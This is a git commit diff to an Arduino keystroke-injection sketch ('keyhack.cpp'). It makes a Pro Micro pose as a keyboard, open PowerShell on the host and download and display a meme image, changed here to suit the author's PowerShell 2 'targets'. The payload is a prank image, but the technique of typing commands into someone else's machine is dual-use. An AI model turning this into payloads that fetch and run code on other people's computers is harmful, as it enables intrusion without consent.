e7862686fee08064cf884fece488da4f2ffcaf13
PangolinPaw <PangolinPaw@users.noreply.github.com>
2015-08-14 16:00:00 +0100

    Make keyhack.cpp compatible with Powershell 2
    iwr wasn't introduced until Powershell v3.0 (my targets have v2.0) so changed code to use the old New-Object method to download the image.

--- backup/keyhack.cpp
+++ backup/keyhack.cpp
@@ -9,9 +9,7 @@ void setup()
 {
   pinMode(buttonPin, INPUT);  // Set the button as an input
   digitalWrite(buttonPin, HIGH);  // Pull the button high
-
- Serial.begin(9600); // Allow printing to the serial monitor for debugging
-
+  Serial.begin(9600); // Allow printing to the serial monitor for debugging
 }
 
 void loop()
@@ -21,6 +19,8 @@ void loop()
  
   if (digitalRead(buttonPin) == 0)
   {
+    RXLED1; // Turn on orange LED while the device is sending instructions
+    
     Serial.println("Open Start menu");
     Keyboard.press(KEY_LEFT_CTRL);
     Keyboard.press(KEY_ESC);
@@ -35,8 +35,13 @@ void loop()
 
     Serial.println("Download image");
     // The pro micro seems to appear as a US keyboard and so @ = " and vice-versa
-    Keyboard.println("powershell -command @& { iwr http://www.quickmeme.com/img/e0/e08438c84e36715ed30df393db08392ab9deefd0b7fb1d9ebaade9e549b18314.jpg -OutFile 'Desktop/image.bmp' }@");
-
+    //Keyboard.println("powershell -command @& { iwr http://www.quickmeme.com/img/e0/e08438c84e36715ed30df393db08392ab9deefd0b7fb1d9ebaade9e549b18314.jpg -OutFile 'Desktop/image.bmp' }@");
+    
+    // iwr wasn't introduced until Powershell v3.0 (my targets have v2.0) so use the old New-Object method to download the image:
+    Keyboard.println("powershell");
+    Keyboard.println("$WebClient = New-Object System.Net.WebClient");
+    Keyboard.println("$WebClient.DownloadFile('http://www.quickmeme.com/img/e0/e08438c84e36715ed30df393db08392ab9deefd0b7fb1d9ebaade9e549b18314.jpg','Desktop/01.jpg')");
+    
     delay(1000); // Wait for download to complete
     
     Serial.println("Open image");
@@ -48,13 +53,15 @@ void loop()
     Keyboard.press(KEY_F11);
     delay(500);
     Keyboard.releaseAll();
+    
+    RXLED0; // Turn off orange LED when the device is done sending instructions
   }
 
   TXLED0; // Green LED flashes to signify readyness
   delay(250);
 }
 
-// .write sends a single character
+// Keyboard.write sends a single character
 // .print sends a series of characters
 // .println sends a series of characters followed by a carriage return
 // .press holds a button
